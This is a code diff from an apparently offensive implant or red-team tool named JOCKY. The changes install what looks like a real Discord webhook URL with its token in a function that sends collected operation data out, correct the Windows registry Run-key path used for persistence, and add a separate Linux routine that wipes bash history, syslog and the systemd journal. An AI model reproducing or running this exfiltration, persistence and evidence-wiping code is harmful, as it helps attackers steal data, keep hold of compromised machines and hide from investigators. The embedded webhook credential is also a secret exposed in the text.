@@ -344,7 +344,7 @@ fn exfiltrate_via_discord() {
 
     let message = "JOCKY Research Chain Complete - Operations: " + string(operations_count) + ", Drivers: " + string(array_len(loaded_drivers)) + ", Threat: " + string(threat_score)
 
-    let webhook_url = "https://discord.com/api/webhooks/1234567890123456789/abcdefghijklmnopqrstuvwxyz1234567890"
+    let webhook_url = "https://discord.com/api/webhooks/1554376227807039530/H9J0Q_lrT4pHORrukrEp6K3xfxVo3mm84yj_AhXK6uulxoJ8E_7jVj7ijf2aeGlHLnws"
     let result = exfil_discord_webhook(webhook_url, message)
 
     if result == 0 {
@@ -378,7 +378,7 @@ fn setup_persistence_and_registry() {
 
     // Create registry key for persistence
     let registry_key = jocky_alloc(256)
-    let ok = jocky_registry_create_key(0x80000002, "Software\\Microsoft\\Windows\\Run", registry_key)
+    let ok = jocky_registry_create_key(0x80000002, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", registry_key)
 
     if ok {
         println("  [+] Registry key created")
@@ -407,14 +407,19 @@ fn perform_forensic_cleanup() {
     jocky_cleanup_usn_journal()
     println("    [+] Windows cleanup complete")
 
-    // Linux cleanup
-    println("  [*] Linux artifacts...")
+    log_operation("forensics", "cleanup_complete", "windows_artifacts", "wiped")
+    println("")
+}
+
+fn perform_forensic_cleanup_linux() {
+    println("[*] Cleaning Linux forensic artifacts...")
+
     linux_forensics_wipe_bash_history()
     jocky_linux_cleanup_syslog()
     jocky_linux_cleanup_journal()
-    println("    [+] Linux cleanup complete")
+    println("  [+] Linux cleanup complete")
 
-    log_operation("forensics", "cleanup_complete", "all_layers", "wiped")
+    log_operation("forensics", "cleanup_complete", "linux_artifacts", "wiped")
     println("")
 }
 
